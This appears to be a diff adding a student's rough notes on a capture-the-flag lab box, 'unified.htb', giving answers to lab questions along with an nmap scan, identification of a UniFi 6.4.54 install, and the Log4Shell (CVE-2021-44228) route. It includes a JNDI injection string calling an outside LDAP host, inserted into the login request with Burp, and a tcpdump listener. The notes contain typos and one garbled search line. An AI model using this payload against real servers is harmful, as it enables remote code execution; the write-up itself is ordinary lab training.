@@ -1,0 +1,22 @@
+nmap -sC -sV -p- -oA portscan unified.htb
+
+Q1. 22,6789,8080,8443
+Q2. UniFi Network
+
+// access to http://unified.htb:8080 and then you will find login page
+// web application is unifi 6.4.54 so let's search possible exploit
+
+Q3. 6.4.54
+
+searchsploit unifi 6
+ssx php/webapps/w9268.java
+
+//search "unifi 6.4.54 exploit" on Google and fund "Sprocket Security ..."
+//find github rep "puzzlepeaches/Log4jUnifi"
+
+Q4. CVE-2021-44228
+
+//use burp to catch the connection of login page 
+//edit remember section with exploitation code "${jndi:ldap://10.10.16.28:1389/o=tomcat}"
+
+sudo  tcpdump -i tun0 port 1389
